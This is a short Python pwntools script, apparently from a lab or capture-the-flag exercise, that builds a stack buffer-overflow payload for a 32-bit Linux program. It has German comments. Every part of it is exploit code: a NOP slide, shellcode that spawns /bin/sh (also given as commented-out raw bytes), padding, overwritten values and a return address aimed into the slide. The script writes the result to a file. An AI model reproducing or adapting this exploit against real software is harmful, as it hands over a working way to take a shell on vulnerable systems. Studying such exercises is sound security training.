from pwn import *


def pack_hex_string(hex_string):
    return pack(int(hex_string, 16), 32)


def pad(input, size):
    padding_length = size - len(input)
    return input + b'B'*padding_length

payload = b''
nop_slide = asm(shellcraft.i386.nop()) * 500
shellcode = asm(shellcraft.i386.linux.sh())
# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += pad(nop_slide + shellcode, 4096)
### Ende buffer
# folgende Adressen werden mit selben Werten Ã¼berschrieben
payload += pack_hex_string('0x0804d160')
payload += pack_hex_string('0xffffde40')
payload += pack_hex_string('0x00000000')
payload += pack_hex_string('0x00000000')
# return adresse: Adresse innerhalb nop slide im buffer
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')
payload += pack_hex_string('0xffffce80')


with open('web_payload.txt', 'wb') as f:
    f.write(payload)
print(payload)


